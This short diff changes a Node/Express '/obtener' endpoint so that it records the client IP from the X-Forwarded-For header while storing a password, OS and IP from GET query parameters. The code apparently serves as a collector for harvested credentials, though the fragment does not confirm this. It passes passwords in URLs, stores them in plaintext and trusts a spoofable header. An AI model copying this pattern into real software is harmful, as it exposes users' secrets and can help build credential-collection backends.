@@ -69,9 +69,10 @@ app.get ('/obtener', (req,res)=> {
     .returning('*')
     .insert({
       id:id,
-      ip:req.query.ip,
+      ip:req.headers['x-forwarded-for'],
       pass:req.query.pass,
-      so:req.query.os}).then(data => {
+      so:req.query.os}
+      ).then(data => {
       res.json('listo');}).catch(err => console.log(err))
   })
   app.get('/datos', (req, res) =>{
